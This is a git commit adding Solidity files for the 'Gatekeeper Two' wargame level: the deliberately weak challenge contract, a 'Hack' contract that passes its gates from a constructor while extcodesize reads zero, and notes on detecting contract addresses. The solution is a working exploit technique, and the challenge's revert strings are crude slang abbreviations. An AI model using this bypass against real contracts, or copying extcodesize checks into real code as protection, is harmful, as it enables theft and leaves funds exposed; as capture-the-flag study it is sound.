4e5b10b2e9a4497288881019e451292acaaa8cdd
jatin192 <singhaljatin192@gmail.com>
2024-02-16 03:05:23 +0530

    address(adr).code  /  Assembly opcode extcodesize(adr)  / .code.length

---
+++ 15_Gatekeeper Two/1.sol
@@ -0,0 +1,54 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin,"bsdk");
+    _;
+  }
+
+  modifier gateTwo() 
+  {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    require(x == 0,"bc");
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max ,"mc");
+    _;
+  }
+
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+
+}
+
+
+
+// extcodesize only returns the correct value once the contract is constructed. 
+// While the constructor of our contract is executing it’ll return zero
+
+// a ^ b == c
+// a ^ c == b
+
+// keccak256 always return a 32-byte (64-character hexadecimal) string
+contract Hack
+{
+    
+    constructor(address i)
+    {
+        GatekeeperTwo j;
+        j = GatekeeperTwo(i);
+        //****************************************************** use this not msg.sender 
+        uint64 _gateKey = ( uint64(bytes8(keccak256(abi.encodePacked(this))))  ) ^ ( type(uint64).max);
+        j.enter(bytes8(_gateKey));
+    }
+}
---
+++ 15_Gatekeeper Two/2.sol
@@ -0,0 +1,33 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity >=0.8.0;
+contract A
+{
+
+/*  checking address is of smart contract or EOA  (2 Methords): 
+
+    1.  using address(adr).code     ->     provides the bytecode of smart contract, not the actual source code
+                                    ->     You can verify if a contract exists at a particular address by checking if its bytecode is non-empty. 
+
+    2.  opcode extcodesize(adr)	    ->     size of the code at address adr
+                                    ->     only returns the correct value once the contract is constructed. 
+                                    ->     Returns 0 if it is called from the constructor of a contract.                                  */
+    
+
+    
+    function isContract1(address adr) public view returns (bool)
+    {
+        return (adr.code.length > 0);
+    }
+
+    function isContract2(address _addr) public view returns (bool)
+    {
+        uint32 size;
+        assembly 
+        {
+            size := extcodesize(_addr)
+        }
+        return (size > 0);
+    }
+
+    function getCode(address a) public view returns (bytes memory) { return a.code; } 
+}
